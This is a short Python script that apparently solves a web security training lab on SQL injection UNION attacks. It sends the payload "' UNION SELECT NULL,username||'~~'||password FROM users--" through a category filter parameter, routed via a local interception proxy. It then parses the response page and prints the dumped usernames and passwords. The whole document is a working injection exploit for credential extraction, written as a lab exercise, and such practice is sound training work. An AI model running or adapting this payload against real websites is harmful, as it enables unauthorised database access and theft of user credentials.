
# SQL injection UNION attack, retrieving multiple values in a single column

# Assumptions:
    # We know number of returned columns
    # We know data type returned columns

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "https://0adc008d0499795ac018b116003b00d5.web-security-academy.net/filter"


# Dumping Users table

payload = "' UNION SELECT NULL,username||'~~'||password FROM users--"

param = {
    "category" : "pets" + payload
}

r = requests.get(url, params=param, verify=False, proxies=proxy)
bs = BeautifulSoup(r.text, 'html.parser')
creds = bs.find_all('th')
print("\n[+] Users table dump")
print("Username \tPassword")
for c in creds:
    c = c.text.split('~~')
    print(f'{c[0]} \t{c[1]}')